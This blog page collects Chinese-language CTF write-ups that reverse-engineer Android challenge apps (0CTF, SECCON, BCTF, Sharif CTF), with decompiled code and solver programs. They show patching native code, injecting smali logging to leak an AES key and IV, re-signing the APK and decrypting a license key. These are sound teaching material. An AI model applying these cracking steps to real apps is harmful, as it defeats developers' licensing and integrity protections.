&#123;</div><div class="line">      v14 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v29, &amp;v20, <span class="string">"Vf"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v14, &amp;v34, &amp;v29);</div><div class="line">      v7 = &amp;v29;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">100000</span> )</div><div class="line">    &#123;</div><div class="line">      v15 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v30, &amp;v20, <span class="string">"S2"</span>);</div><div class="line">      cocos2d::CCUserDefault::setStringForKey(v15, &amp;v34, &amp;v30);</div><div class="line">      v7 = &amp;v30;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v3 != (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">1000000000</span> )</div><div class="line">      &#123;</div><div class="line">LABEL_25:</div><div class="line">        v17 = cocos2d::CCString::createWithFormat((cocos2d::CCString *)<span class="string">"%d"</span>, v3);</div><div class="line">        (*(<span class="keyword">void</span> (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(v18 + <span class="number">264</span>) + <span class="number">428</span>))(</div><div class="line">          *(_DWORD *)(v18 + <span class="number">264</span>),</div><div class="line">          *(_DWORD *)(v17 + <span class="number">20</span>));</div><div class="line">        <span class="keyword">return</span> sub_3A1DDC(&amp;v20);</div><div class="line">      &#125;</div><div class="line">      v16 = cocos2d::CCUserDefault::sharedUserDefault(v5);</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v31, &amp;v20, <span class="string">"4w"</span>);</div></pre></td></tr></table></figure>
<p>打上一局游戏, root权限查看sharedpreference, 可以发现部分flag:MGN0ZntDMGNvUzJkX0FuRHJv<strong>MWRf</strong>dz99</p>
<p>注意加粗的地方是与分数先关的, 其余的或许与前面或许与后面有关, 我们不敢确定, 但是我们可以把缺少的分数部分补全.MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99, 解码得到0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}.</p>
<h2 id="Other-write-ups-and-resources"><a href="#Other-write-ups-and-resources" class="headerlink" title="Other write-ups and resources"></a>Other write-ups and resources</h2><ul>
<li><a href="https://eugenekolo.com/blog/0ctf-2016-boomshakalaka-writeup/" target="_blank" rel="external">https://eugenekolo.com/blog/0ctf-2016-boomshakalaka-writeup/</a></li>
<li><a href="https://github.com/p4-team/ctf/blob/master/2016-03-12-0ctf/boomshakalaka/README.md" target="_blank" rel="external">P4 Team</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/28/boomshakalaka-3/" data-id="cj86rj00b000ago99wlzew7hw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/28/SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1/" class="article-date">
  <time datetime="2017-09-28T08:49:43.000Z" itemprop="datePublished">2017-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/28/SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1/">SECCON Quals CTF 2015 Reverse-Engineering Android APK 1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SECCON-Quals-CTF-2015-Reverse-Engineering-Android-APK-1"><a href="#SECCON-Quals-CTF-2015-Reverse-Engineering-Android-APK-1" class="headerlink" title="SECCON Quals CTF 2015: Reverse-Engineering Android APK 1"></a>SECCON Quals CTF 2015: Reverse-Engineering Android APK 1</h1><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1" target="_blank" rel="external">Github Link</a></p>
<blockquote>
<p>题目比较简单,不多赘述</p>
</blockquote>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>不需要Overview,直接看代码逻辑即可</p>
<h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>根据惯例对apk反编译,直接看Java代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt)</div><div class="line">    localTextView.setText(<span class="string">"SECCON&#123;"</span> + String.valueOf(<span class="number">107</span> * (MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.calc())) + <span class="string">"&#125;"</span>);</div></pre></td></tr></table></figure></p>
<p>可以看出flag是形如<code>SECCON{107*(1000 + calc)}</code>形式,只有一个未知量是函数calc返回值,而这个函数是native函数,将lib中任意一个so文件拖入IDA,找到对应函数形式如下所示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">public Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc</div><div class="line">Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc proc near</div><div class="line">mov     eax, 7</div><div class="line">retn</div><div class="line">Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc endp</div><div class="line"></div><div class="line">_text ends</div></pre></td></tr></table></figure></p>
<p>竟然直接返回7!</p>
<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>107*1007=107749</code><br>flag is SECCON{107749}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/28/SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1/" data-id="cj86rizzv0003go993v5ma7uw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-BCTF2016-pingpongmachine" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/28/BCTF2016-pingpongmachine/" class="article-date">
  <time datetime="2017-09-28T08:49:43.000Z" itemprop="datePublished">2017-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/28/BCTF2016-pingpongmachine/">BCTF2016 pingpongmachine</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="pingpong-555"><a href="#pingpong-555" class="headerlink" title="pingpong - 555"></a>pingpong - 555</h1><p>拿到题之后解包, 整体上Java逻辑没有明显混淆, C层用了O-LLVM混淆, 但是代码量不大. 整体上没有加壳或者对完整性校验. 通过观察Java层逻辑, 要求我们依次点击ping pong两个按键, 共计100万次.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="keyword">this</span>.p = <span class="number">0</span>;</div><div class="line">    <span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">    <span class="keyword">this</span>.ttt = <span class="number">1000000</span>;</div><div class="line">    <span class="keyword">this</span>.tt = <span class="keyword">this</span>.ttt;</div><div class="line">    <span class="keyword">this</span>.jping = <span class="keyword">new</span> com.geekerchina.pingpongmachine.MainActivity$<span class="number">1</span>(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">this</span>.jpong = <span class="keyword">new</span> com.geekerchina.pingpongmachine.MainActivity$<span class="number">2</span>(<span class="keyword">this</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">1</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        --MainActivity.<span class="keyword">this</span>.tt;</div><div class="line">        MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.ping(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</div><div class="line">        ++MainActivity.<span class="keyword">this</span>.num;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        View v0 = MainActivity.<span class="keyword">this</span>.findViewById(<span class="number">2131427414</span>);</div><div class="line">        ((TextView)v0).setText(<span class="string">"PING"</span>);</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</div><div class="line">            ((TextView)v0).setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">0</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        --MainActivity.<span class="keyword">this</span>.tt;</div><div class="line">        MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.pong(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</div><div class="line">        ++MainActivity.<span class="keyword">this</span>.num;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        View v0 = MainActivity.<span class="keyword">this</span>.findViewById(<span class="number">2131427414</span>);</div><div class="line">        ((TextView)v0).setText(<span class="string">"PONG"</span>);</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</div><div class="line">            ((TextView)v0).setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>在C层会发现sleep(1) 暂停一秒, 如果直接调用点击时间肯定不够, 因此将sleep一秒patch掉, 可以改为 mov r1, r1.<br>之后自己写一个包名和原程序相同的包, 依次调用ping 和pong 共计100万次, 随后输出结果.</p>
<p>一个示例的调用程序为:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">setContentView(R.layout.activity_main);</div><div class="line"><span class="keyword">int</span> p = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</div><div class="line"></div><div class="line">p = pong(p, num);</div><div class="line">num ++;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> tt = <span class="number">1000000</span> - <span class="number">1</span>; tt != <span class="number">0</span>; --tt)&#123;</div><div class="line">    <span class="keyword">if</span>(tt % <span class="number">2</span> == <span class="number">0</span>)&#123;</div><div class="line">        p = ping(p,num);</div><div class="line">        num ++;</div><div class="line">        <span class="keyword">if</span>(num &gt;=<span class="number">7</span>) num = <span class="number">0</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        p = pong(p, num);</div><div class="line">        num ++;</div><div class="line">        <span class="keyword">if</span>(num &gt;= <span class="number">7</span>) num = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//Log.e("yourdad", Integer.toString(p));</span></div><div class="line">((TextView)findViewById(R.id.a)).setText(String.valueOf(p));</div></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/28/BCTF2016-pingpongmachine/" data-id="cj86rizzg0001go993jab5att" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Commercialapplication" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/28/Commercialapplication/" class="article-date">
  <time datetime="2017-09-28T08:49:43.000Z" itemprop="datePublished">2017-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/28/Commercialapplication/">Sharif University Quals CTF 2014 Commercial Application</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Sharif-University-Quals-CTF-2014-Commercial-Application"><a href="#Sharif-University-Quals-CTF-2014-Commercial-Application" class="headerlink" title="Sharif University Quals CTF 2014: Commercial Application"></a>Sharif University Quals CTF 2014: Commercial Application</h1><p><a href="https://github.com/ctfs/write-ups-2014/tree/master/su-ctf-quals-2014/commercial_application/" target="_blank" rel="external">Github Link</a></p>
<blockquote>
<p>Markdown哪儿都好就是插图太麻烦,尽量用语言描述</p>
</blockquote>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>题目给的是一个Demo小程序,安装在手机或者虚拟机之后看是一个看图程序,一共三张<del>黄</del>图图,预览版只可以看一张,输入key之后可以看另外两张,提供了一个输入key的窗口,输入错误之后会提示错误(废话),想必正确的key就是题目的flag.</p>
<h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>首先例行的对给的apk进行基础操作,我的习惯是同时恢复Java代码和Smali代码.分析的时候Java代码比较方便,出错或者是需要重新打包dex的时候使用Smali.逆向之后发现程序没有lib目录,且Java代码只经过简单混淆,没有报错,说明单纯分析Java代码逻辑即可.</p>
<p>从输入错误key时候给出的报错语句入手,<code>Your licence key is incorrect...! Please try again with another.</code>这句在源程序中出现两次,都在<code>/edu/sharif/ctf/activities/MainActivity.java</code>之中,查看代码关键位置.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface paramDialogInterface, <span class="keyword">int</span> paramInt)</span></span></div><div class="line"><span class="function">      </span>&#123;</div><div class="line">        <span class="keyword">if</span> (KeyVerifier.isValidLicenceKey(<span class="keyword">this</span>.val$userInput.getText().toString(), MainActivity.<span class="keyword">this</span>.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.<span class="keyword">this</span>.app.getDataHelper().getConfig().getSecurityIv()))</div><div class="line">        &#123;</div><div class="line">          MainActivity.<span class="keyword">this</span>.app.getDataHelper().updateLicence(<span class="number">2014</span>);</div><div class="line">          MainActivity.isRegisterd = <span class="keyword">true</span>;</div><div class="line">          MainActivity.<span class="keyword">this</span>.showAlertDialog(<span class="keyword">this</span>.val$context, <span class="string">"Thank you, Your application has full licence. Enjoy it...!"</span>);</div><div class="line">          <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        MainActivity.<span class="keyword">this</span>.showAlertDialog(<span class="keyword">this</span>.val$context, <span class="string">"Your licence key is incorrect...! Please try again with another."</span>);</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
<p>发现关键逻辑位于KeyVerifier.isValidLicenceKey函数中,对所在文件进行分析,会发现实质性调用的是encrypt函数,该函数需要三个参数.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isValidLicenceKey</span><span class="params">(String paramString1, String paramString2, String paramString3)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">return</span> encrypt(paramString1, paramString2, paramString3).equals(<span class="string">"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84"</span>);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String paramString1, String paramString2, String paramString3)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">try</span></div><div class="line">    &#123;</div><div class="line">      SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> SecretKeySpec(hexStringToBytes(paramString2), <span class="string">"AES"</span>);</div><div class="line">      Cipher localCipher = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</div><div class="line">      localCipher.init(<span class="number">1</span>, localSecretKeySpec, <span class="keyword">new</span> IvParameterSpec(paramString3.getBytes()));</div><div class="line">      String str = bytesToHexString(localCipher.doFinal(paramString1.getBytes()));</div><div class="line">      <span class="keyword">return</span> str;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (Exception localException)</div><div class="line">    &#123;</div><div class="line">      localException.printStackTrace();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>由代码可以发现,加密使用AES算法,对称加密就可逆,现在需要找出使用的三个参数paramString1,paramString2,paramString3,即可逆推出输入的值.回到MainActivity中考察传递三个参数的位置作分析,<br><code>KeyVerifier.isValidLicenceKey(this.val$userInput.getText().toString(), MainActivity.this.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.this.app.getDataHelper().getConfig().getSecurityIv())</code><br>第一个参数是从UI中读入的用户输入,即用户输入的key,第二个是SecurityKey,第三个是SecurityIv,通过调用进一步分析源码包括程序带的SQLite数据库可以找到后两者的值,而AES加密之后的值应该是<br><code>29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84</code><br>这里使用一个<del>奇技淫巧</del>不去进一步考察代码,而是修改Smali代码,在使用三个值之前将它们从Log中打印出来,条用位置位于<code>class Ledu/sharif/ctf/activities/MainActivity$4</code>之中<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.line</span> 211</div><div class="line"><span class="keyword">    .local</span> v0, <span class="string">"iv"</span>:<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v3&#125;, <span class="class">Landroid/util/Log;</span>-&gt;v(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v2&#125;, <span class="class">Landroid/util/Log;</span>-&gt;v(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v0&#125;, <span class="class">Landroid/util/Log;</span>-&gt;v(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line"></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v2, v0&#125;, <span class="class">Ledu/sharif/ctf/security/KeyVerifier;</span>-&gt;isValidLicenceKey(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)Z</div><div class="line"></div><div class="line">   <span class="built_in"> move-result </span>v1</div></pre></td></tr></table></figure></p>
<p>重新打包dex,插入apk中,签名,运行之后随便输入点东西,通过Logcat可以截取三条Log,tag都是随便输入的内容,后两条即SecurityKey,SecurityIv<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SecurityKey = 37eaae0141f1a3adf8a1dee655853714</div><div class="line">SecurityIv = a5efdbd57b84ca36</div><div class="line">encrypted = 29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84</div></pre></td></tr></table></figure></p>
<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>经过以上分析,已经可以基本确定解决问题方法,即利用KeyVerifier中的代码,更改Cipher工作模式为解密,接触答案并ASCII化为字符串,即为key(flag).完整代码如下所示<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.company;</div><div class="line"></div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        <span class="comment">// write your code here</span></div><div class="line">        String encrypted = <span class="string">"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84"</span>;</div><div class="line">        String securityKey = <span class="string">"37eaae0141f1a3adf8a1dee655853714"</span>;</div><div class="line">        String securityIv = <span class="string">"a5efdbd57b84ca36"</span>;</div><div class="line">        String result = decrypt(encrypted, securityKey, securityIv);</div><div class="line">        System.out.println(result);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span> </span>&#123;</div><div class="line">        StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</div><div class="line">        <span class="keyword">int</span> i = paramArrayOfByte.length;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; ; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (j &gt;= i)</div><div class="line">                <span class="keyword">return</span> localStringBuilder.toString();</div><div class="line">            <span class="keyword">int</span> k = paramArrayOfByte[j];</div><div class="line">            Object[] arrayOfObject = <span class="keyword">new</span> Object[<span class="number">1</span>];</div><div class="line">            arrayOfObject[<span class="number">0</span>] = Integer.valueOf(k &amp; <span class="number">0xFF</span>);</div><div class="line">            localStringBuilder.append(String.format(<span class="string">"%02x"</span>, arrayOfObject));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> SecretKeySpec(hexStringToBytes(paramString2), <span class="string">"AES"</span>);</div><div class="line">            Cipher localCipher = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</div><div class="line">            localCipher.init(Cipher.DECRYPT_MODE, localSecretKeySpec, <span class="keyword">new</span> IvParameterSpec(paramString3.getBytes()));</div><div class="line">            <span class="keyword">byte</span>[] bytes = localCipher.doFinal(hexStringToBytes(paramString1));</div><div class="line">            String flag = <span class="string">""</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytes) &#123;</div><div class="line">                flag += (<span class="keyword">char</span>) b;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> flag;</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception localException) &#123;</div><div class="line">            localException.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hexStringToBytes(String paramString) &#123;</div><div class="line">        <span class="keyword">int</span> i = paramString.length();</div><div class="line">        <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[i / <span class="number">2</span>];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; ; j += <span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (j &gt;= i)</div><div class="line">                <span class="keyword">return</span> arrayOfByte;</div><div class="line">            arrayOfByte[(j / <span class="number">2</span>)] = (<span class="keyword">byte</span>) ((Character.digit(paramString.charAt(j), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.digit(paramString.charAt(j + <span class="number">1</span>), <span class="number">16</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行得到结果<br><strong>Flag:</strong><code>fl-ag-IS-se-ri-al-NU-MB-ER</code></p>

      
    </div>
    <footer class="article-footer">
